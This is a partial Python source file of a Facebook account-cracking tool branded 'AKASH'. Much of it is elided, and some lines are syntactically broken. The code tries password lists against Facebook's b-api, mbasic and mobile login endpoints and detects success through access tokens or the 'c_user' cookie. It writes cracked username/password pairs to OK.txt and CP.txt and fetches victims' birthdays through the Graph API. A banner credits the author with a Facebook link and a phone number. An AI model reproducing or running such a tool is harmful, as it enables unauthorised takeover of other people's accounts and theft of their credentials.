...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#AKASH('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							AKASH('[•] Result CP saved to CP.txt')
							AKASH('\n\tCrack Processing...\n')
							AKASH('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					AKASH('\n01.) Metode b-api ')
					AKASH('02.) Metode mbasic ')
					AKASH('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			AKASH('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			AKASH(' [1] AKASH Method 1 ')
			AKASH(' [2] AKASH Method 2  [ Pro ]')
			AKASH(' [3] AKASH Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [AKASH] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				AKASH('\r\033[1;92m[Successful-AKASH] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					AKASH('\r\033[1;91m[Checkpoint-AKASH] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				AKASH('\r\033[1;91m[Checkpoint-AKASH] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				AKASH('\r\033[1;32m[Successful-AKASH] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].AKASH('\r\033[1;91m[Checkpoint-AKASH] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				AKASH('\r\033[1;92m[Successful-AKASH] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : AKASH
    Facebook : https://facebook.com/akash.black.hacker.bd
    Team     : AKASH 
    Connect  : 01734021816
 [*]=============================================
